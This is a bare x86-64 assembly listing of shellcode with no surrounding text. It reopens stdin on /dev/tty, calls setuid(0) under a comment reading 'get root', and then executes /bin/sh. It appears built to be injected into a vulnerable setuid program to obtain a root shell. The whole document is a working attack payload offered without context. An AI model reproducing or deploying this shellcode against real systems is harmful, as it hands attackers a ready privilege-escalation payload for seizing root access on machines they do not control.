org 0x0000

[bits 64]

START:
call near L1
DATA:
db "/bin/sh", 0
TTY:
db "/dev/tty",0
AR0:
db 0,0,0,0,0,0,0,0
AR1:
db 0,0,0,0,0,0,0,0
L1:
pop rbx
mov [rbx+AR0-DATA], rbx

;close stdin
mov rdi, 0
mov eax, 3 ;sys_close
syscall

;open stdin again
lea rdi, [rbx+TTY-DATA]
xor rsi, rsi ; O_RDONLY
xor rdx, rdx ; ?
mov eax, 2 ; sys_open
syscall

;get root
mov rdi, 0
mov eax, 105 ; sys_setuid
syscall

;open shell
mov eax, 59 ;sys_execvp
mov rdi, rbx
lea rsi, [rbx+AR0-DATA]
xor rdx, rdx
syscall
int3

